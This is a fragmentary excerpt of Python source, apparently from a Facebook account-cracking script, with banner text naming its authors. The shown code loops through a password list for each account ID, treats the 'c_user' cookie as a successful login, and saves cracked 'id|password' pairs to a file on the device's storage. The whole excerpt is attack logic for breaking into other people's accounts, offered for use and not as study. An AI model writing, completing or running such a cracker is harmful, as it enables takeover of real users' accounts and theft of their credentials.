...
def fia():    
			print(logo)
			print('\x1b[1;91m>>> NAYEM / NUSRAT :\x1b[1;92m 1.1 ')
			linex()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				...
				open('/sdcard/NAYEM-CP.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[NAYEM / NUSRT] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
